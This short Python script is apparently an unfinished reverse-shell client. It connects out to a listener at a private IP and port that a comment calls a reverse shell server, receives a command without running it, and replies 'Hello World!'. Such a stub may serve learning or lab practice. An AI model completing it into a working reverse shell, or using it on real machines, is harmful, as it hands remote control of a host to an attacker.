#!/usr/bin/python

import socket

def shell():
    command = sock.recv(1024)
    message = "Hello World!"
    sock.send(message.encode('utf-8'))

# Create IPv4 TCP object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to reverse shell server
sock.connect(("192.168.0.21", 54321))

shell()

sock.close()
